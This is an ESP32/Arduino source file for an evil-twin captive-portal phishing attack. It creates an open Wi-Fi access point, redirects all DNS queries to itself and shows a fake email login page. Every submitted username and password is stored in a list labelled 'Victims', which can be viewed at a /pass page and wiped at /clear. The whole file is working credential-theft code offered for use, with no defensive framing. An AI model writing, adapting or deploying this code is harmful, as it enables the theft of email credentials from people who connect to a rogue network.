// Includes
#include <WiFiMulti.h>
#include <DNSServer.h>
#include <WebServer.h>

// User configuration
const char* SSID_NAME = "WiFi";
const char* SUBTITLE = "Welcome!";
const char* TITLE = "Login:";
const char* BODY = "Log in with your Email account to access the network.";
const char* POST_TITLE = "Validating...";
const char* POST_BODY = "Your Email account is being validated. Please wait up to 3 minutes for device connection.<br>Thank you.";
const char* PASS_TITLE = "Victims";
const char* CLEAR_TITLE = "Cleared";

//System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway

String Victims = "";
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String footer() {
  return "<br><footer><div><center><p>Copyright&#169; 2023 | All rights reserved.</p></center></div></footer>";
}

String header(String t) {
  String a = String(SSID_NAME);

  String CSS = "#login-text { color: #808080;}"
               "header h1 { color: #ffffff; }"
               ".username-label {color: #30b2b4;}"
               ".password-label {color: #30b2b4;}"
               "body { font-family: 'Helvetica', sans-serif; background-color: #242424; margin: 0;font-style: italic; }"
               "header { background-color: #30b2b4; color: #fff; padding: 2rem 0; text-align: center; }"
               "h1 { margin: 0; font-size: 2.5rem; color: #ffffff; }"
               "p { font-size: 1.2rem; margin: 0.5rem 0; color: #ccc; }"
               ".container { max-width: 400px; margin: 0 auto; padding: 2rem; background-color: #242424; border-radius: 10px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); }"
               "input { width: 100%; padding: 12px 20px; margin: 8px 0; box-sizing: border-box; border-radius: 4px; border: 2px solid #4a4a4a; font-size: 1rem; }"
               "input[type=submit] { background: #4a4a4a; color: white; cursor: pointer; border: none; font-size: 1rem; }"
               "input[type=submit]:hover { background: #4a4a4a; }";
               
  String h = "<!DOCTYPE html><html>"
             "<head><title>" + a + " :: " + t + "</title>"
             "<meta name=viewport content=\"width=device-width, initial-scale=1\">"
             "<style>" + CSS + "</style></head>"
             "<body><header><h1>" + a + "</h1><p>" + SUBTITLE + "</p></header>"
             "<div class=\"container\"><h1>" + t + "</h1>";

  return h;
}


String pass() {
  return header(PASS_TITLE) + "<ol>" + Victims + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}

String index() {
  return header(TITLE) + "<div id=login-text>" + BODY + "</ol></div><div><form action=/post method=post>" +
         "<b class=username-label> Username:   </b> <center> <input type=text name=username placeholder=username></center>" +
         "<b class=password-label> Password: </b> <center> <input type=password name=password placeholder=password></center>" +
         "<center><input type=submit value=Login></center></form>" + footer();
}

String posted() {
  String username = input("username");
  String password = input("password");
  Victims = "<li>Email:  <b>" + username + "</b></br>Password:  <b style=color:#ea5455;>" + password + "</b></li>" + Victims;
  return header(POST_TITLE) + POST_BODY + footer();
}

String clear() {
  Victims = "";
  return header(CLEAR_TITLE) + "<div><p>The Victims list has been cleared.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

void setup() {
  bootTime = lastActivity = millis();

  WiFi.mode(WIFI_AP_STA); // Use both AP and STA modes
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);

  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only HTTP)

  webServer.on("/post", []() {
    webServer.send(HTTP_CODE, "text/html", posted());
  });

  webServer.on("/pass", []() {
    webServer.send(HTTP_CODE, "text/html", pass());
  });

  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear());
  });

  webServer.onNotFound([]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index());
  });

  webServer.begin();

}

void loop() {
  if ((millis() - lastTick) > TICK_TIMER) {
    lastTick = millis();
  }
  dnsServer.processNextRequest();
  webServer.handleClient();
}
